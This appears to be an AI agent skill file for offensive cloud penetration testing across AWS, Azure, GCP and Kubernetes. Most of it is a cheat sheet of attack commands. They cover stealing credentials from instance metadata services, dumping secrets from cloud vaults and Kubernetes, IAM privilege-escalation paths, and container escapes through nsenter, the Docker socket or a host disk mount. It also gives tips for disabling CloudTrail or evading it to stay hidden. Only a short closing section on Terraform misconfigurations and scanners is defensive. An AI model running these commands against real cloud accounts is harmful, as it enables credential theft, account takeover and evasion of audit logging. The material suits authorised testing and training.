---
name: cloud-security
description: Cloud penetration testing — AWS/Azure/GCP privilege escalation, container escape, Kubernetes attacks, serverless exploitation, IaC misconfigurations
metadata:
  type: offensive
  phase: exploitation
  tools: pacu, prowler, scoutsuite, trivy, kubectl, aws-cli, az-cli, gcloud, cloudfox, peirates
---

# Cloud Security & Attack

## When to Activate

- Cloud infrastructure penetration testing
- AWS/Azure/GCP privilege escalation
- Container and Kubernetes security assessment
- Serverless function exploitation
- IaC (Terraform/CloudFormation) security review
- Cloud credential abuse and lateral movement

## AWS Attacks

### Initial Enumeration
```bash
# Caller identity
aws sts get-caller-identity

# Account enumeration
aws iam list-users
aws iam list-roles
aws iam list-policies --only-attached
aws iam get-account-authorization-details  # full dump

# S3 enumeration
aws s3 ls
aws s3 ls s3://bucket-name --recursive
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# EC2
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]'

# Lambda
aws lambda list-functions
aws lambda get-function --function-name NAME  # includes download link
aws lambda get-policy --function-name NAME
```

### Privilege Escalation
```bash
# Pacu (automated AWS exploitation)
pacu
> import_keys --all
> run iam__enum_permissions
> run iam__privesc_scan
> run iam__bruteforce_permissions

# Common privesc paths:
# iam:CreatePolicyVersion → create admin policy version
# iam:SetDefaultPolicyVersion → activate old permissive version
# iam:AttachUserPolicy → attach AdministratorAccess
# iam:CreateLoginProfile → create console password for any user
# iam:UpdateLoginProfile → change any user's password
# iam:PassRole + lambda:CreateFunction → create Lambda with admin role
# iam:PassRole + ec2:RunInstances → launch EC2 with admin role
# sts:AssumeRole → assume cross-account admin role
# lambda:UpdateFunctionCode → inject code into existing Lambda

# SSRF to IMDS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token
```

### Post-Exploitation
```bash
# Secrets Manager / Parameter Store
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id NAME
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# RDS snapshots (public)
aws rds describe-db-snapshots --snapshot-type public

# CloudTrail disruption (stealth)
aws cloudtrail describe-trails
aws cloudtrail stop-logging --name trail-name  # LOUD but effective
# Better: use regions without CloudTrail, or use API calls that aren't logged
```

## Azure Attacks

### Enumeration
```bash
# Azure AD enumeration
az ad user list
az ad group list
az ad app list
az role assignment list --all

# Resource enumeration
az resource list
az vm list
az storage account list
az keyvault list

# Token from IMDS
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Privilege Escalation
```bash
# Managed Identity abuse
# Any Azure resource with MI can request tokens for other services

# Automation Account RunAs
# Extract certificate → authenticate as service principal

# Key Vault access
az keyvault secret list --vault-name VAULT
az keyvault secret show --vault-name VAULT --name SECRET

# Azure AD Connect (on-prem sync)
# Extract credentials from ADSync database → DCSync

# Consent grant attack
# Illicit consent: trick admin into granting app permissions
# Application with Mail.Read, Files.ReadWrite.All
```

## GCP Attacks

```bash
# Service account enumeration
gcloud iam service-accounts list
gcloud projects get-iam-policy PROJECT_ID

# Metadata server
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Privilege escalation
# iam.serviceAccountKeys.create → create key for any SA
# iam.serviceAccounts.actAs → impersonate service account
# compute.instances.setMetadata → add SSH key to any VM
# deploymentmanager.deployments.create → deploy as project editor

# Storage bucket enumeration
gsutil ls
gsutil ls gs://bucket-name
gsutil cp gs://bucket-name/secret.txt .
```

## Kubernetes Attacks

### Enumeration
```bash
# Check permissions
kubectl auth can-i --list
kubectl get secrets --all-namespaces
kubectl get pods --all-namespaces

# Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Use with: kubectl --token=$TOKEN --server=https://kubernetes.default.svc

# API server direct
curl -k https://kubernetes.default.svc/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $TOKEN"
```

### Exploitation
```bash
# Privileged pod escape
# If privileged: mount host filesystem
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Pod with hostPID/hostNetwork
# Access host processes, network stack

# Writable hostPath mount
# Write to /etc/cron.d/ on host

# Peirates (k8s pentesting tool)
peirates
> get-secrets
> attack-mount-host-filesystem
```

### Container Escape
```bash
# Docker socket mounted
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# Privileged container
mount /dev/sda1 /mnt
chroot /mnt

# CVE-based escapes
# CVE-2019-5736 (runc) — overwrite host runc binary
# CVE-2020-15257 (containerd) — abstract socket access
# CVE-2022-0185 — file_system_context heap overflow
```

## IaC Security Review

### Terraform Misconfigurations
```hcl
# Dangerous patterns to flag:
# - Security groups with 0.0.0.0/0 ingress
# - S3 buckets without encryption or public access block
# - IAM policies with "*" actions/resources
# - RDS instances publicly accessible
# - CloudTrail logging disabled
# - KMS keys without rotation
# - Lambda functions with admin roles
```

### Tools
```bash
# Automated scanning
prowler aws --severity critical high
scoutsuite aws
trivy config ./terraform/
checkov -d ./terraform/
tfsec ./terraform/
```
